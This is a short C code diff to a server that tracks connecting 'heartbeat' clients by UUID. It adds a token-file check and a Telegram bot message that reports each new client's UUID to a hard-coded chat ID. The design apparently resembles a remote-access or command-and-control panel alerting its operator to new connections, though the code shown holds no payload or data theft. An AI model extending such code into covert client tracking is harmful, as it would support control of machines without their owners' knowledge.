@@ -10,6 +10,16 @@ SOCKET heartbeat_init() {
     return sock;
 }
 
+uint8_t check_token() {
+    FILE* fp = fopen("token.txt", "r");
+    if (!fp) {
+        return 0;
+    }
+    fclose(fp);
+    return 1;
+}
+
+
 void* heartbeat_accept_thread(void* args) {
     struct Args{
         SOCKET sock; Client *clients; uint16_t* clients_count;
@@ -36,6 +46,14 @@ void* heartbeat_accept_thread(void* args) {
         UuidToStringA(&uuid, &str);
         printf("Connected client with UUID: %s\n", str);
 
+        if (check_token()) {
+            printf("Sending telegram\n");
+            char token[256] = {0};
+            get_token(token);
+            telegram_send_message(token, "763411878", str);
+        } else {
+            printf("Warning: u dont link telegram bot.\n");
+        }
         clients[*clients_count].sock = client;
         clients[*clients_count].uuid = uuid;
 
